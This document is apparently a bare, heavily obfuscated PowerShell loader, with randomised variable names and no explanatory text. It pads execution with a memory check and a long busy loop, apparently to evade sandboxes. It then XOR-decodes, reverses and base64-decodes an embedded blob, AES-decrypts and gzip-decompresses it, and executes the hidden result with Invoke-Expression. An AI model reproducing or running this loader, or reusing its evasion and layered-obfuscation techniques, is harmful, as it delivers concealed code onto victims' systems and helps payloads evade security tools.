$jstzkmtywxmj = (Get-Process -Id $PID | Select-Object Name,@{Name="WorkingSet";Expression={($_.ws / 1024kb)}}).WorkingSet
if ($jstzkmtywxmj -lt 250) { $tnqqphzzkpipzsquw = "a" * 300MB }
$nmuiposxyqsrpj = 0
$gppoxhkkjqxwsx = 30000000
For ($nmuiposxyqsrpj=0; $nmuiposxyqsrpj -lt $gppoxhkkjqxwsx;$nmuiposxyqsrpj++) { $nmuiposxyqsrpj++ }
$vvoyzsmrqv = [System.Text.Encoding]::UTF8.GetBytes("ukpwutxompkvom")
$jsnoxyhmui = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JCM2NSEWGRodGiUFH1lMJR4BATURGEIqDUAgPhkqHB8PJ09ARiIcJDs6MV4+GwAcCA4mW19ZBzgtGAAjHARMAVhCLDwpJToMGSBNBjkHKCQ6Ny07Aw8BMEM/CVwcMV45AwUlHSo5GQJOK1hAXBgCCg9eRjheQSg2OUhaL1pVDzITMjIgT18fGz8iXio3LTIlTQMqN1s2MS8cHQUTBgRMERlfGREaEQkuOkQAQAADKisrEQUiJwYcEkUGPSMdOlUFORsCBD1fI0RERiguRjNcXTklPAQ2I1pbEwwPKRIkAV0NCTIYBidTGiwSOzEuGxNeIR4nFSg8Xh45Lg0gJFkHFT5BV1wFRy0EHyMnUwYwDQJMFg4XAUAtJTA+RBQ0OxVEJEcCJV4BLxJEDgEtSgtfIREMIx8YQCdFEDFXDSYmMV0+WgFZRlxeIBkXW0kmPB8ARDs1AlofNC1aNgUnOQgDDz9ENhguNhk9CTskWwJZIyECTBIjBRMtISc/BAIDQT82HwYUAlwAISYtEwVBAR8sHCIXCAE6XQcoI08QI1c4JAcoHF0fFCoIGEwmKCIHOAlBAVgmX18dTAcsHAwWBAJdKgQdWyUeEQInLjJeDAwEPg4VEBpAAQodEx4zPQ8MXjsPMD0vNlUbAhUtFxIvWxM0DTsZIyofPzYoAVgeITZDEQZaHQAdAFgPDidEGSxTOSlIDA8jOS8FBB4gMxwkJUU5NSEFFFwnLT49DT09FyU/NzQlWB4bADgZGwcoJxQYXiBcMzIaQjI/FyBbDB1YJxxIMF5HDBghOTs6Wg4UPSFOTBtKCSk4XUQcPF4nICUZMjcEAzMvBlcfPj0xGQUyHSo3QRgsAFw3AwcERCMWPVhBBxwAByRaIicwGi5eNVs8OTdeJRIHADkFDg5ZMQlPBwYAXRokQEYCBxVAKEAdGRYTCTYsMxA1PUMNBiYuGgNIIDwWIVcLAANCP1VaUgIBMyQUXh1JGFkeHTEpBBYwQToiGlsPHio4BjsfO14CPVxdEykYPQ89GDYVHjM2KgA/BD9AH0YBOzMXQgw/JgkyQikjNwoWQyMOPEQEOwEhHg4EOTUaHBc+F1kiOl0ZPUYkWy8sEAsiKQAFHCs9ByITJUZAFwgGJx0eCx0nWDUELDoRLkI4LR4YVTwkFB4WAxxaHzcDFR8XBi8WOCcNMlgKSAIOKCk6Ikk0Ph8KPyoUKBE9LEIdQxADQwkiNR1cWSAIGy1EJSBDHg00Mz0hIQVeAkE4BhEOCiAkKDIAPhgFMU4+FTkqLyEeI0ApDA4WQ146OgMXFiYHGDcbBTtGRhpAPSQ9XBkIPSVSRgczJDA6XCIJLyk9LF07Ag06Il40GR0dOiMMDzkNFCVIXy43DhcKOy0yNQMEOgkOGgYzBiIkRQRALTcwSAcLAh8DXT4nPCIZBjJXAFkSHhMCAR0oCEADLhIdHBgARys5PDEHLi8HThgARzwEQC43WBszMwA8XwsTO0M2AyQKOxg+IRE/Ch0DLiA1MQ0BH0UsFz8iKRNECV47PgYFLBUeOAMKDxMGLhhcGidHIDQED0RbPVhfEi8gES8MTAoDKhI9J1s0Bgo0QTAQCw8YERErPhY4WzgXAgg4KTYPADUEPhwHFUJbK0QHNR5EPRhMOSgeHgAhWigTMTNfOActKAYyAxo3CCkaMilCAyQlJgcnSQggPFslNS5BBkMyLRA/XiJBBj1XRkc6QgEMGhoLXh8cHRwVAA0FGTwdDRsDIhoGP10YWBguGidJPRkSPF07WRQ5HxgdRVc7GBIxRRs5FCYgGx0uSgguNQ4kBDkzEyYmMyxOXjo6XjULGwwYQhw0ARk9FCkyNSwvOV1IJgEmGzoMKB06KyAhJCVENC03GV8SLCYjNEUFPDAMFT47O18fAxUPIxwcITpETCIVJFNELB04WjNAPC0ZKgpCDU4JFUc6GwQBEB4LGjFTPysqGjg4XEUnTERbHwcyHygAOAEfQBMXNSExPR0kGz8nQj42GEEAKjQiAQsrQ18fPzEQOVgoHD8gARcRGFsFRFsKXlwcA0cBJzZSXx80JhY+OgMhT1ssPQ0WIkZDSRg4Q181PgE9ODEwTTAhJztHBkEZISUbPTkmEz8XBxUABxpcIBg2BEAWLxgYKCM5ChofIRkaFhUXCl03PAMMOyIzOhEPTR4sJhdYJAULGhMfFhBBGToKBDEcIl0HIxcSBhkMNlhbHzssLhQ4ETUcFxAsPR1TIl0OMF0zQB4bIgc6GAkyNTgaAxMdWjIPOhVDDS8uVAQHIQICHzs2VD0vOxohACw3QF4HER8oRi4fJDQMXAAOMz5NXT01IjglIBgkNAYAJS4LXigGNyhCHCkZIwMOPgY6ITwsKwElJBwPE0woAzwSKTMDWQMqEQ0ZMhJWBjUNQy0rRi4kDi0MPgQrFR06BQsbOxYnEgETHikDGxItLi0RMjkHTC8iBzUpGVkoXjg8OSABFjoBQgcyIBtGXF8RTUYaID4zCjcfJC0pHU8GNx4dRkURQTUORCk6EjsZG1oCJAEXIywxUjIlXiIaJAkmXx0gOT44IxgtHz8eORYnBAEqADsALiQtCwIBQwgiGzU+QERPGw4NCh0TCRM7HgcYQjgkIi4bLEAYRQk3OkQxOVoxNworQyIQKxsgPEcuOjNAIRoCXg4BKgZaAxY/EiA7QjkHNAk0Qz0ZEhhMO1ggNwJERFshCAI6LEJMXwI9LRhaAx0bMhQeLQ0CHB4YJyJaHC0yFk08CgA+RzFZGAk4Byg9TAcLCAkhGTwMAQQkKC0wEhAbHQoeWTc1MxIzMSEYEyg3J1g9"))
$vjqtvhitzzhyxjvhy = [System.Text.Encoding]::UTF8.GetBytes($jsnoxyhmui)
$rhyurqyohpo = $(for ($ujmmhmpiwyommvstp = 0; $ujmmhmpiwyommvstp -lt $vjqtvhitzzhyxjvhy.length; ) {
    for ($wioujuqqzyj = 0; $wioujuqqzyj -lt $vvoyzsmrqv.length; $wioujuqqzyj++) {
        $vjqtvhitzzhyxjvhy[$ujmmhmpiwyommvstp] -bxor $vvoyzsmrqv[$wioujuqqzyj]
        $ujmmhmpiwyommvstp++
        if ($ujmmhmpiwyommvstp -ge $vjqtvhitzzhyxjvhy.Length) {
            $wioujuqqzyj = $vvoyzsmrqv.length
        }
    }
})
$rhyurqyohpo = [System.Text.Encoding]::UTF8.GetString($rhyurqyohpo)
$jpimqtwqvgrphnrgq = "$rhyurqyohpo"
$tsvmyvmqsigoxgwo = $jpimqtwqvgrphnrgq.ToCharArray()
[array]::Reverse($tsvmyvmqsigoxgwo)
$nyitozuvyjh = -join($tsvmyvmqsigoxgwo)
$yhuojsszxptuw = [System.Convert]::FromBase64String("$nyitozuvyjh")
$ssvpqvpxtqkrh = [System.Convert]::FromBase64String("2uTuIwgWaUGpl4nezHArgXxf17gSvTiCOAgPCLDVtwE=")
$xnhgynxuiuwkxrsh = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"
$ytqnokpmxngh = $xnhgynxuiuwkxrsh.ToCharArray()
[array]::Reverse($ytqnokpmxngh)
$psgpoymnszqj = -join($ytqnokpmxngh)
$gzximnuoyonyji = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($psgpoymnszqj))
$tgzuyjmvjp = New-Object "$gzximnuoyonyji"
$yyymyhnnumvg = "==wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$vrqpzhirion = $yyymyhnnumvg.ToCharArray()
[array]::Reverse($vrqpzhirion)
$rwtqxxroutgznsu = -join($vrqpzhirion)
$huuvhrrhqqrh = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($rwtqxxroutgznsu))
$romwzzyhxhvp = & ([scriptblock]::Create($huuvhrrhqqrh))
$tgzuyjmvjp.Mode = $romwzzyhxhvp
$ztmzrymiuvxuiywt = "==wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$koiomtoshrno = $ztmzrymiuvxuiywt.ToCharArray()
[array]::Reverse($koiomtoshrno)
$zgkwwnmhuxuk = -join($koiomtoshrno)
$yhrzwwzuryvvvsx = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($zgkwwnmhuxuk))
$jxqipxqvnk = & ([scriptblock]::Create($yhrzwwzuryvvvsx))
$tgzuyjmvjp.Padding = $jxqipxqvnk
$tgzuyjmvjp.BlockSize = 128
$tgzuyjmvjp.KeySize = 256
$tgzuyjmvjp.Key = $ssvpqvpxtqkrh
$tgzuyjmvjp.IV = $yhuojsszxptuw[0..15]
$hniophiouxmuigzhm = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))
$oyyrngmukky = New-Object $hniophiouxmuigzhm(,$tgzuyjmvjp.CreateDecryptor().TransformFinalBlock($yhuojsszxptuw,16,$yhuojsszxptuw.Length-16))
$nxvjjynhnt = New-Object $hniophiouxmuigzhm
$okkipnvnwwt = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))
$pzymqsqyhz = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))
$orrxqiymsnqnpw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkd6aXBTdHJlYW0="))
$wpjnvwuvhmyypxypp = New-Object $orrxqiymsnqnpw $oyyrngmukky, ($pzymqsqyhz::$okkipnvnwwt)
$wpjnvwuvhmyypxypp.CopyTo($nxvjjynhnt)
$wpjnvwuvhmyypxypp.Close()
$tgzuyjmvjp.Dispose()
$oyyrngmukky.Close()
$jsruhhytym = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))
$vgoisnwqphkg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))
$mwgwssupvvuxqjztv = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))
$oojjgtkkgnygj = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))
$xkiyrgnqqj = $jsruhhytym::$vgoisnwqphkg.$oojjgtkkgnygj($nxvjjynhnt.$mwgwssupvvuxqjztv())
Invoke-Expression($xkiyrgnqqj)
